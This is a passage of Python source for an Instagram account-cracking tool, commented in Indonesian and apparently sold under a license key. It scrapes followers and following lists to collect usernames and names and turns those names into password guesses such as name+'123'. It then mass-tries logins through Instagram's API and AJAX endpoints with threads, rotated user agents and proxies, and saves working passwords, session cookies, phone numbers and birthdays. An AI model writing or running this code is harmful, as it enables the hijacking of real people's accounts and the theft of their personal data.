oid_promotion_entry_from_ads_manager_universe,ig_android_live_special_codec_size_list,ig_android_enable_share_to_messenger,ig_android_background_main_feed_fetch,ig_android_live_video_reactions_creation_universe,ig_android_channels_home,ig_android_sidecar_gallery_universe,ig_android_upload_reliability_universe,ig_migrate_mediav2_universe,ig_android_insta_video_broadcaster_infra_perf,ig_android_business_conversion_social_context,android_ig_fbns_kill_switch,ig_android_live_webrtc_livewith_consumption,ig_android_destroy_swipe_fragment,ig_android_react_native_universe_kill_switch,ig_android_stories_book_universe,ig_android_all_videoplayback_persisting_sound,ig_android_draw_eraser_universe,ig_direct_search_new_bootstrap_holdout_universe,ig_android_cache_layer_bytes_threshold,ig_android_search_hash_tag_and_username_universe,ig_android_business_promotion,ig_android_direct_search_recipients_controller_universe,ig_android_ad_show_full_name_universe,ig_android_anrwatchdog,ig_android_qp_kill_switch,ig_android_2fac,ig_direct_bypass_group_size_limit_universe,ig_android_promote_simplified_flow,ig_android_share_to_whatsapp,ig_android_hide_bottom_nav_bar_on_discover_people,ig_fbns_dump_ids,ig_android_hands_free_before_reverse,ig_android_skywalker_live_event_start_end,ig_android_live_join_comment_ui_change,ig_android_direct_search_story_recipients_universe,ig_android_direct_full_size_gallery_upload,ig_android_ad_browser_gesture_control,ig_channel_server_experiments,ig_android_video_cover_frame_from_original_as_fallback,ig_android_ad_watchinstall_universe,ig_android_ad_viewability_logging_universe,ig_android_new_optic,ig_android_direct_visual_replies,ig_android_stories_search_reel_mentions_universe,ig_android_threaded_comments_universe,ig_android_mark_reel_seen_on_Swipe_forward,ig_internal_ui_for_lazy_loaded_modules_experiment,ig_fbns_shared,ig_android_capture_slowmo_mode,ig_android_live_viewers_list_search_bar,ig_android_video_single_surface,ig_android_offline_reel_feed,ig_android_video_download_logging,ig_android_last_edits,ig_android_exoplayer_4142,ig_android_post_live_viewer_count_privacy_universe,ig_android_activity_feed_click_state,ig_android_snippets_haptic_feedback,ig_android_gl_drawing_marks_after_undo_backing,ig_android_mark_seen_state_on_viewed_impression,ig_android_live_backgrounded_reminder_universe,ig_android_live_hide_viewer_nux_universe,ig_android_live_monotonic_pts,ig_android_search_top_search_surface_universe,ig_android_user_detail_endpoint,ig_android_location_media_count_exp_ig,ig_android_comment_tweaks_universe,ig_android_ad_watchmore_entry_point_universe,ig_android_top_live_notification_universe,ig_android_add_to_last_post,ig_save_insights,ig_android_live_enhanced_end_screen_universe,ig_android_ad_add_counter_to_logging_event,ig_android_blue_token_conversion_universe,ig_android_exoplayer_settings,ig_android_progressive_jpeg,ig_android_offline_story_stickers,ig_android_gqls_typing_indicator,ig_android_chaining_button_tooltip,ig_android_video_prefetch_for_connectivity_type,ig_android_use_exo_cache_for_progressive,ig_android_samsung_app_badging,ig_android_ad_holdout_watchandmore_universe,ig_android_offline_commenting,ig_direct_stories_recipient_picker_button,ig_insights_feedback_channel_universe,ig_android_insta_video_abr_resize,ig_android_insta_video_sound_always_on'''
	SIG_KEY_VERSION = '4'

	def __init__(self,username,password):
		self.username=username
		self.password=password
		m = hashlib.md5()
		m.update(username.encode('utf-8') + password.encode('utf-8'))
		self.device_id = self.generateDeviceId(m.hexdigest())
		self.uuid = self.generateUUID(True)
		self.s = requests.Session()

	def generateDeviceId(self, seed):
		volatile_seed = "12345"
		m = hashlib.md5()
		m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
		return 'android-' + m.hexdigest()[:16]

	def generateUUID(self, type):
		generated_uuid = str(uuid.uuid4())
		if (type):
			return generated_uuid
		else:
			return generated_uuid.replace('-', '')

	def loginAPI(self):
		token=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).text
		crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
		self.s.headers.update({'Connection': 'close',
			'Accept': '*/*',
			'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Cookie2': '$Version=1',
			'Accept-Language': 'en-US',
			'User-Agent': user_agentAPI()})
		self.data = json.dumps({
			'phone_id': self.generateUUID(True),
			'_csrftoken': crf_token,
			'username': self.username,
			'guid': self.uuid,
			'device_id': self.device_id,
			'password': self.password,
			'login_attempt_count': '0'})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(self.data)
		)
		x=self.s.post("https://i.instagram.com/api/v1/accounts/login/", self.payload)
		x_jason=json.loads(x.text)
		x_kukis=x.cookies.get_dict()
		if "logged_in_user" in x.text:
			kuki=";".join([v+"="+x_kukis[v] for v in x_kukis])
			#id=x_jason['logged_in_user']['pk']
			#nm=x_jason['logged_in_user']['full_name']
			#pn=x_jason['logged_in_user']['phone_number']
			return {'status':'success','cookie':kuki,'userame':self.username}
		elif 'challenge_required' in x.text:
			return {'status':'checkpoint'}
		else:
			return {'status':'login_error'}
C = ''

class instagram:
	def __init__(self,external,username,cookie):
		self.ext=external
		self.username=username
		self.cookie=cookie
		self.s=requests.Session()
		self.tol = Console()
	def logo(self):
		for i in external:
			try:
				nama=i.split('|')[0]
				followers=i.split('|')[1]
				following=i.split('|')[2]
			except:
				pass
			banner()
			self.mentod()
			#insta = prints
			#crack = PanelPanel
			print(f'\n     01. Crack pengkut\n     02. Crack mengikuti\n     03. Cek hasil\n     00. Logout')

	def mentod(self):
	       	for i in external:
	       		nama=i.split('|')[0]
	       		followers=i.split('|')[1]
	       		following=i.split('|')[2]
	       	try:
	       	       ses=requests.Session()
	       	       lisen=open('data/lisensi.txt','r').read()
	       	       met = ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIzMjA4OTAxMyIsInRqSVB5U1dJQkFVdU1yMmFGVGk5eW5ZbnpuOWlmS3FHVjVMdG1Yb1EiXQ==&ProductId=17890&Key='+lisen).json()
	       	       men = met['licenseKey']
	       	       key = men['key'][0:11]
	       	       tahun = men['expires'][0:4]
	       	       buln = men['expires'][5:7]
	       	       tanggal = men['expires'][8:10]
	       	       bulan=bulan_ttl[buln]
	       	       tahun1 = men['created'][0:4]
	       	       buln1 = men['created'][5:7]
	       	       tanggal1 = men['created'][8:10]
	       	       bulan1=bulan_ttl[buln1]
	       	except:
	       	       key = "-"
	       	       tanggal = "-"
	       	       bulan = "-"
	       	       tahun = "-"
	       	       tanggal1 = "-"
	       	       bulan1 = "-"
	       	       tahun1 = "-"

	def HapusLisen(self):
	    try:
	        xc = input(f"{P}[{B}?{P}] apakah anda yakin ingin menghapus lisensi? : {H}")
	        if xc in ["y","Y"]:
	           os.remove("data/lisensi.txt")
	           jalan(f"{P}[{H}✓{P}] berhasil menghapus lisensi")
	           exit()
	        elif xc in ["t","T"]:
	            jalan(f"{P}[{B}+{P}] kembali ke menu utama")
	            time.sleep(2)
	            self.menu()
	        else:
	            self.Exit()
	    except:pass
	
	def Exit(self):
		try:
		    xd = input(f'{P}[{M}?{P}] mau exit bersama cookie anda? ({M}y{P}/{H}t{P}) : ')
		    if xd in ["y","Y"]:
		       RemoveCookie()
		       print('BERHASIL')
		       exit()
		    elif xd in ["t","T"]:
		        time.sleep(2)
		        self.menu()
		    else:
		         self.Exit()
		except:pass

	def sixAPI(self,six_id):
		url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
		x = requests.get(url)
		x_jason = x.json()
		uid = str( x_jason['users'][0].get("user").get("pk") )
		return uid

	def unfollowAPI(self,user_id,username_id,cookie):
		uuid=generateUUID(True)
		xx=self.s.get("https://www.instagram.com/",headers={"user-agent":USN}).content
		crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
		s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': USN})

		data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})

		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(data))
		return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text


	def searchAPI(self,cookie,nama):
		try:
			for ba in range(100):
				x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				try:
					for i in x_jason['users']:
						user=i['user']
						username=user['username']
						fullname=user['full_name']
						internal.append(f'{username}|{fullname}')
					prints(Panel(f"""{warna_putih} SEDANG MENGUMPULKAN USERNAME"""))
					loading()
					time.sleep(0.0002)
				except:
					if 'challenge' in x.text:
						break
					else:
						continue
			print("\r")
		except Exception as e:print(e)
		return internal
	
	def ua_ig(self):
	    rr = random.randint
	    return (f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}.{str(rr(7,12))}; MBOX Build/PPR1.181005.003; wv {str(rr(7,12))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,105))}.0.{str(rr(1111,4444))}.{str(rr(111,400))} Safari/537.36")
	
	def idAPI(self,cookie,id):
		if 'sukses' in lisensiku:
			try:
				m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
				m_jason=m.json()["data"]["user"]
				idx=m_jason["id"]
			except requests.exceptions.ConnectionError:
				print(f'{P}[{M}!{P}] koneksi internet anda bermasalah');exit()
			except requests.exceptions.ConnectionError:
			    print(f'{P}[{M}!{P}] koneksi internet anda bermasalah')
			    time.sleep(0.3)
			    exit()
			except Exception as e:
				print(f'{P}[{M}!{P}] username tidak tersedia')
				exit()
			return idx
		else:lisensi()
    	
	def infoAPI(self,cookie,api,id):
		if 'sukses' in  lisensiku:
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'pengikut' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=200&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
							#prints(Panel(f"""{warna_putih}SEDANG MENGUMPULKAN USERNAME"""))
					#		loading()
							time.sleep(0.0002)
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				print("\r")
			except Exception as e:
				print(f'USERNAME TIDAK ADA')
			return internal
		else:lisensi()
		
	def ifoAPI(self,cookie,api,id):
		if 'sukses' in  lisensiku:
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'mengikuti' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/following/?count=200&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
							#prints(Panel(f"""{warna_putih}SEDANG MENGUMPULKAN USERNAME"""))
						#	loading()
							time.sleep(0.0002)
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				print("\r")
			except Exception as e:
				print(f'{P}username tidak tersedia')
			return internal
		else:lisensi()

	def ingfoocu(self, cookie):
		with requests.Session() as ses:
		     try:
		         link = ses.get(f"https://i.instagram.com/api/v1/accounts/edit/web_form_data/", headers={"user-agent":USN},cookies={"cookie":cookie}).json()["form_data"]
		         nomor = link["phone_number"].replace("-", "").replace(" ", "")
		         tggl = link["birthday"]
		         year, month, day = tggl.split("-")
		         month = bulan_ttl[month]
		         tanggal = (f"{day} {month} {year}")
		     except:
		         nomor = "-"
		         tanggal = "-"
		     return nomor, tanggal
	
	def AdityaCreate(self, cookie):
		with requests.Session() as ses:
		     try:
		         b = ses.get("https://www.instagram.com/accounts/access_tool/", cookies={"cookie":cookie})
		         soup = parser(b.text,'html.parser')
		         body = soup.find("body")
		         script = body.find("script", text=lambda t: t.startswith("window._sharedData"))
		         script_json = script.string.split(" = ", 1)[1].rstrip(";")
		         script_json = json.loads(script_json)
		         i = script_json["entry_data"]['SettingsPages']
		         regax = re.findall('\d+',str(i))
		         tahun = datetime.fromtimestamp(int(regax[0])).strftime('%d %B %Y')
		     except:
		         tahun = "-"
		     return tahun
	
	def ingfo(self):
		print(f'\n[+] Simpan Results : OK:{day}.txt\n[+] Simpan Results : CP:{day}.txt\n[+] Jika tidak ada hasil hidupkan mode pesawat 10 detik\n')

	def methodku(self):
		insta = prints
		crack = Panel
		print(f'\033[0m\n     01. Method AJAK\n     02. Method API')
	def passwordAPI(self,xnx):
		print(f"[+] total username  : {len(internal)}")
		self.methodku()
		u = input(f'\n{P}[{H}+{P}] Chouse : ')
		if u in [""]:
		    method.append('satu')
		elif u in ["1","01"]:
		    method.append('satu')
		elif u in ["2","02"]:
		    method.append('tiga')
		elif u in ["3","03"]:
			method.append('dua')
		else:
			method.append('satu')
		print(f"""\n     01. sandi,sandi123,sandi1245\n     02. sandi,sandi123,sandi1234,sandi12345\n     03. sandi,sandi123,sandi1234,sandi12345,sandi123456\n     00. fullsandi + manual""")
		c=input(f'\n{P}[{H}+{P}] sandi : ')
		if c in ["1","01"]:
			self.generateAPI(xnx,c)
		elif c in ["2","02"]:
			self.generateAPI(xnx,c)
		elif c in ["3","03"]:
			self.generateAPI(xnx,c)
		elif c in ["4","04"]:
			zx=input(f'{P}[{H}?{P}] masukan password : {H}')
			self.generateAPI(xnx,c,zx)
		else:
			self.passwordAPI(xnx)

	def generateAPI(self,user,o,zx=''):
		global prog,des
		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(bar_width=23),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
		des = prog.add_task('',total=len(internal))
		self.ingfo()
		with prog:
		    with ThreadPoolExecutor(max_workers=15) as asepxc:
		     for i in user:
		        try:
		            username=i.split("|")[0]
		            password=i.split("|")[1].lower()
		            for w in password.split(" "):
		                if len(w)<3:
		                    continue
		                else:
		                    w=w.lower()
		                    if o=="1":
		                        if len(w)==3 or len(w)==4 or len(w)==5:
		                            sandi=[w,w+'123',w+'1234']
		                        else:
		                            sandi=[w,w+'123',w+'1234']
		                    elif o=="2":
		                        if len(w)==3 or len(w)==4 or len(w)==5:
		                            sandi=[w,w+'123',w+'1234',password.lower()]
		                        else:
		                            sandi=[w+'123',w,w+'1234',password.lower()]
		                    elif o=="3":
		                        if len(w)==3 or len(w)==4 or len(w)==5:
		                            sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',password.lower()]
		                        else:
		                            sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',password.lower()]
		                    elif o=="4":
		                        if len(w)==3 or len(w)==4 or len(w)==5:
		                            sandi = zx.replace(" ", "").split(",")
		                        else:
		                            sandi = zx.replace(" ", "").split(",")
		                    asepxc.submit(self.crackAPI,username,sandi)			
		        except:
		            pass
		print('\n')
		prints(Panel(f" {P2}crack {R2}{len(internal)} {P2}username selesai hasil Ok : {H2}{len(success)}{P2} Hasil Cp : {K2}{len(checkpoint)}{P2} ",width=80,padding=(0,8),style=f"#FFFFFF"))
		exit()
				
                        
                        
                        
	def ingfoocu(self, cookie):
		with requests.Session() as ses:
		     try:
		         link = ses.get(f"https://i.instagram.com/api/v1/accounts/edit/web_form_data/", headers={"user-agent":USN},cookies={"cookie":cookie}).json()["form_data"]
		         nomor = link["phone_number"].replace("-", "").replace(" ", "")
		         tggl = link["birthday"]
		         year, month, day = tggl.split("-")
		         month = bulan_ttl[month]
		         tanggal = (f"{day} {month} {year}")
		     except:
		         nomor = "-"
		         tanggal = "-"
		     return nomor, tanggal

	def APIinfo(self,user):
		try:
			x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
			x_jason=x.json()["data"]["user"]
			nama=x_jason["full_name"]
			pengikut=x_jason["edge_followed_by"]["count"]
			mengikut=x_jason["edge_follow"]["count"]
			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
		except:
			nama = "-"
			pengikut = "-"
			mengikut = "-"
			postingan = "-"
		return nama,pengikut,mengikut,postingan
	
	def crackAPI(self,user,pas):
		global loop,success,checkpoint
		ses = requests.Session()
		logtemp=0
		guid = str(uuid.uuid4())
		ponid = str(uuid.uuid4())
		andro = "android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
		ig_sig = HARIS["ig_sig"]
		verig = HARIS["IGV"]
		igver = verig.split(",")
		igv = random.choice(igver)
		gedz = HARIS1["AOREC"][random.randrange(0,277)]["aorec"]
		ven1 = gedz.split('|')[1]
		ven2 = gedz.split('|')[2]
		giu1 = HARIS["giu"]
		giu = giu1.split("||")
		ua = f'{giu[0]} {igv} {giu[1]} {ven1}; {ven2}; {giu[2]}'
		dat = HARIS["sinkz"]
		dat.update({"id": guid})
		data1 = json.dumps(dat)
		ned = hmac.new(ig_sig.encode('utf-8'), str(data1).encode('utf=8'),hashlib.sha256).hexdigest()
		data2 = HARIS["sinkz1"]
		data2.update({'signed_body': f'{ned}.{str(data1)}'})
		head = HARIS["headaing"]
		head.update({"user-agent": ua})
		while True:
				try:
					p = ses.post(HARIS["sinkz2"],headers=head,data=data2)
					break
				except:pass
		prog.update(des,description=f'\r[deep_white]crack {(loop)}/{len(internal)}[/] [green]OK[/]:[green]{len(success)} [/]=[yellow] CP[/]:[yellow]{len(checkpoint)}')
		prog.advance(des)
		for pw in pas:
				try:
					data = json.dumps({"phone_id":ponid,"_csrftoken": ses.cookies["csrftoken"],"username":user,"guid":guid,"device_id":andro,"password": pw,"login_attempt_count": str(logtemp)})
					ned = hmac.new(ig_sig.encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()
					head2 = HARIS["headaing1"]
					head2.update({"user-agent": ua})
					pasw = pw.replace(' ','+')
					sianjing = HARIS["sianjing"]
					setan = sianjing.split("||")
					dataa = f'{setan[0]}{ned}{setan[1]}{ponid}{setan[2]}{ses.cookies["csrftoken"]}{setan[3]}{user}{setan[4]}{guid}{setan[5]}{andro}{setan[6]}{pw}{setan[7]}{logtemp}{setan[8]}'
					respon = ses.post(HARIS["crack"],headers=head2,data=dataa)
					try:
						xyaaXD = json.loads(respon.text)
					except:
						xyaaXD = (respon.text)
					logtemp+=1
					if "logged_in_user" in str(xyaaXD) or "sessionid" in ses.cookies.get_dict():
						success.append(user)
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
						nomor, tanggal = self.ingfoocu(cookie)
						tree = Tree("")
						tree.add(f"\r{H}{nama} | {user}{N}")
						tree.add(f"\r{N}Pengikut  : {H}{pengikut}{N}")
						tree.add(f"\r{N}Mengikuti : {H}{mengikut}{N}")
						tree.add(f"\r{N}Nomor Hp  : {H}{nomor}{N}")
						tree.add(f"\r{N}Tanggal   : {H}{tanggal}{N}")
						tree.add(f"\r{N}Postingan : {H}{postingan}{N}").add(f"\r{N}Token : {H}{cookie}{N}")
						prints(tree)
						open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}|{cookie}\n')
						break
					elif 'https://i.instagram.com/challenge' in str(respon.text):
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						tree = Tree("")
						tree.add(f"\r{M}{nama} | {user} {N} ")
						tree.add(f"\r{N}Pengikut  : {K}{pengikut}{N}")
						tree.add(f"\r{N}Mengikuti : {K}{mengikut}{N}")
						tree.add(f"\r{N}Postingan : {H}{postingan}{N}")
						prints(tree)
						open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
						checkpoint.append(user)
						break
				except requests.exceptions.ConnectionError:
					time.sleep(5)
					self.crackAPI(user,pas)
					loop-=1
					break
				except Exception as e:
					pass
		loop+=1
					
				
	def crackAPIversi2(self,user,pas):
		global loop,success,checkpoint
		ses = requests.Session()
		ua = random.choice(baru)
		sys.stdout.write(f'\r{P}[{H}√{P}] {H}http://Instagram {P}{loop}/{len(internal)}{P} OK:{H}{len(success)} {N}CP:{K}{len(checkpoint)} {P}');sys.stdout.flush()
		try:
			for pw in pas:
				xxcteam = random.randint(1000000000, 99999999999)
				jam = calendar.timegm(current_GMT)
				proxy = {'http': 'socks5://'+random.choice(prox)}
				p = ses.get('https://z-p15.www.instagram.com/accounts/login/?force_classic_login&hl=en')
				head = {
				       "Host": "z-p15.www.instagram.com",
				       "Connection": "keep-alive",
				       "Content-Length": "320",
				       "X-IG-WWW-Claim": "0",
				       "X-Instagram-AJAX": "9080db6b6a51",
				       "Content-Type": "application/x-www-form-urlencoded",
				       "Accept": "*/*",
				       "X-Requested-With": "XMLHttpRequest",
				       "X-ASBD-ID": "198387",
				       "User-Agent": ua,
				       "X-CSRFToken": p.cookies['csrftoken'],
				       "X-IG-App-ID": "1217981644879628",
				       "Origin": "https://z-p15.www.instagram.com",
				       "Sec-Fetch-Site": "same-origin",
				       "Sec-Fetch-Mode": "cors",
				       "Sec-Fetch-Dest": "empty",
				       "Referer": "https://z-p15.www.instagram.com/accounts/login/",
				       "Accept-Encoding": "gzip, deflate",
				       "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				       }
				data = {
				      "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{jam}:{pw}",
				      "username":user,
				      "queryParams":"{}",
				      "optIntoOneTap":"false",
				      "stopDeletionNonce":"",
				      "trustedDeviceRecords":"{}"
				      }
				respon=ses.post("https://z-p15.www.instagram.com/accounts/login/ajax/", headers = head, data = data, proxies = proxy, allow_redirects = False)
				xc_team=json.loads(respon.text)
				if "userId" in str(xc_team) or "sessionid" in ses.cookies.get_dict():
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
					nomor, tanggal = self.ingfoocu(cookie)
					tree = Tree("")
					tree.add(f"\r{H}{nama} | {user}{N}")
					tree.add(f"\r{N}Pengikut  : {H}{pengikut}{N}")
					tree.add(f"\r{N}Mengikuti : {H}{mengikut}{N}")
					tree.add(f"\r{N}Nomor Hp : {H}{nomor}{N}")
					tree.add(f"\r{N}Tanggal : {H}{tanggal}{N}")
					tree.add(f"\r{N}Postingan : {H}{postingan}{N}").add(f"\r{N}Token : {H}{cookie}{N}")
					prints(tree)
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}|{coki}\n')
					success.append(user)
					break
				elif 'href="https://www.instagram.com/challenge/action/"' in str(xc_team):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					tree = Tree("")
					tree.add(f"\r{M}{nama} | {user} {N} ")
					tree.add(f"\r{N}Pengikut  : {K}{pengikut}{N}")
					tree.add(f"\r{N}Mengikuti : {K}{mengikut}{N}")
					tree.add(f"\r{N}Postingan : {H}{postingan}{N}")
					prints(tree)
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif 'ip_block' in str(respon.text):
					sys.stdout.write(f'\r{P}[{M}×{P}] {M}ip.com{P}{loop}/{len(internal)}{P} OK:{H}{len(success)} {N}CP:{K}{len(checkpoint)} {P}');sys.stdout.flush()
					time.sleep(10)
					self.crackAPIversi2(user,pas)
				else:
					continue
			loop+=1
		except:
			self.crackAPIversi2(user,pas)
	
	def crackAJAX(self,user,pas):
		global loop,success,checkpoint
		ses = requests.Session()
		uas = random.choice(UaNgentodMuach)
		sys.stdout.write(f'\r{P}[{H}#{P}] crack {H}stabil {P}{loop}/{len(internal)}{P} OK-:{H}{len(success)} {N}CP-:{K}{len(checkpoint)} {P}');sys.stdout.flush()
		try:
			for pw in pas:
				xxcteam = random.randint(1000000000, 99999999999)
				jam = calendar.timegm(current_GMT)
				p = ses.get(str(random.choice([
				      "https://www.secure.instagram.com/accounts/login/",
				      "https://www.secure.instagram.com/accounts/login/?force_classic_login=&",
				      "https://www.secure.instagram.com/accounts/login/?force_classic_login&hl=en",
				      "https://www.secure.instagram.com/accounts/onetap/",
				      "https://www.secure.instagram.com/accounts/onetap/?next=%2F",
				      "https://www.secure.instagram.com/accounts/onetap/?next=/"
				      ])))
				head = {
				      "Host": "www.secure.instagram.com",
				      "Connection": "keep-alive",
				      "Content-Length": "318",
				      "X-IG-WWW-Claim": "0",
				      "X-Instagram-AJAX": "9080db6b6a51",
				      "Content-Type": "application/x-www-form-urlencoded",
				      "Accept": "*/*",
				      "X-Requested-With": "XMLHttpRequest",
				      "X-ASBD-ID": "198387",
				      "User-Agent": uas,
				      "X-CSRFToken": p.cookies['csrftoken'],
				      "X-IG-App-ID": "1217981644879628",
				      "Origin": "https://www.secure.instagram.com",
				      "Sec-Fetch-Site": "same-origin",
				      "Sec-Fetch-Mode": "cors",
				      "Sec-Fetch-Dest": "empty",
				      "Referer": "https://www.secure.instagram.com/accounts/login/",
				      "Accept-Encoding": "gzip, deflate",
				      "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				      }
				head2 = {
				      "Host": "www.secure.instagram.com",
				      "Connection": "keep-alive",
				      "Upgrade-Insecure-Requests": "1",
				      "User-Agent": uas,
				      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				      "dnt": "1",
				      "X-Requested-With": "mark.via.gp",
				      "Sec-Fetch-Site": "none",
				      "Sec-Fetch-Mode": "navigate",
				      "Sec-Fetch-User": "?1",
				      "Sec-Fetch-Dest": "document",
				      "Referer": "https://www.secure.instagram.com/accounts/login/",
				      "Accept-Encoding": "gzip, deflate",
				      "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				      }
				param = {
				      "Host": "www.secure.instagram.com",
				      "Connection": "keep-alive",
				      "Cache-Control": "max-age=0",
				      "Upgrade-Insecure-Requests": "1",
				      "User-Agent": uas,
				      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				      "X-Requested-With": "mark.via.gp",
				      "Sec-Fetch-Site": "none",
				      "Sec-Fetch-Mode": "navigate",
				      "Sec-Fetch-User": "?1",
				      "Sec-Fetch-Dest": "document",
				      "Referer": f"https://www.secure.instagram.com/"+user+"/",
				      "Accept-Encoding": "gzip, deflate",
				      "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				      }
				data = {
				      "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{jam}:{pw}",
				      "username":user,
				      "queryParams":"{}",
				      "optIntoOneTap":"false",
				      "stopDeletionNonce":"",
				      "trustedDeviceRecords":"{}"
				      }
				dateku = str(random.choice([param, head2]))
				respon=ses.post("https://www.secure.instagram.com/accounts/login/ajax/",headers = head, data = data, allow_redirects = dateku)
				xc_team=json.loads(respon.text)
				if "userId" in str(xc_team) or "sessionid" in ses.cookies.get_dict():
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					coki = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
					print("\r                                       ")
					adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-Agent: {uazku()}\ncookies   : {coki}'
					pepekXD = nel(adit, style='green')
					print('\n')
					cetak(nel(pepekXD,style='',title='\r[green]Account Login Method AJAX[white]'))
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break
				elif 'href="https://www.instagram.com/challenge/action/"' in str(xc_team):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("\r                                       ")
					adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-agent: {uazku()}'
					pepekXD = nel(adit, style='yellow')
					print('\n')
					cetak(nel(pepekXD,style='', title='\r[yellow]Account Check Method AJAX[white]'))
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif 'ip_block' in str(respon.text):
					sys.stdout.write(f'\r{P}[{M}#{P}] crack {M}spamIP {P}{loop}/{len(internal)}{P} OK-:{H}{len(success)} {N}CP-:{K}{len(checkpoint)} {P}');sys.stdout.flush()
					time.sleep(10)
					self.crackAJAX(user,pas)

				else:
					continue
			loop+=1
		except:
			self.crackAJAX(user,pas)
	
	def checkAPI(self,usr,pwd):
		try:
			ts = calendar.timegm(current_GMT)
			xyaaXD = random.randint(1000000000, 99999999999)
			ses = requests.Session()
			ts = calendar.timegm(current_GMT)
			sys.stdout.write(f'\r{P}[{H}#{P}] {H}cheking {N}{usr}{P}');sys.stdout.flush()
			response = ses.get(f"https://z-p42.www.instagram.com/accounts/login/?force_classic_login&hl=en").text
